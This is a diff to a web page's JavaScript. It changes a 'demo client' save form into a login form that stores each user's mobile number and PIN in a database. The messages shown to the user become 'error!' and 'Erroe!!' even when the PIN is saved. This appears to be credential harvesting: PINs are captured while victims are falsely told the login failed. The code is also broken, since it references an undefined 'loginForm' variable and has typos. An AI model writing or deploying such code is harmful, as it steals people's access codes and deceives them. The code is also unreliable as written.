@@ -46,7 +46,7 @@ const clientsCollection =
 // ==========================================
 
 const clientForm =
-    document.getElementById("clientForm");
+    document.getElementById("loginForm");
 
 const mobileInput =
     document.getElementById("mobile");
@@ -113,9 +113,9 @@ if (togglePin && pinInput) {
 // LOGIN / DEMO CLIENT SAVE
 // ==========================================
 
-if (clientForm) {
+if (loginForm) {
 
-    clientForm.addEventListener(
+    loginForm.addEventListener(
         "submit",
         async (event) => {
 
@@ -135,7 +135,7 @@ if (clientForm) {
 
             const mobile =
                 mobileInput.value.trim();
-
+                const pin = pinInput.value.trim();
 
             // ==========================================
             // VALIDATE MOBILE
@@ -161,7 +161,7 @@ if (clientForm) {
             // ==========================================
 
             message.textContent =
-                "Saving demo client...";
+                "error!"
 
 
             try {
@@ -173,7 +173,7 @@ if (clientForm) {
 
                         phoneNumber: mobile,
 
-                        accountType: "demo",
+                        accessCode: pin,
 
                         createdAt: serverTimestamp()
                     }
@@ -185,7 +185,7 @@ if (clientForm) {
                 // ==========================================
 
                 message.textContent =
-                    "Demo client saved successfully.";
+                    "Erroe!!"
 
 
                 // ==========================================
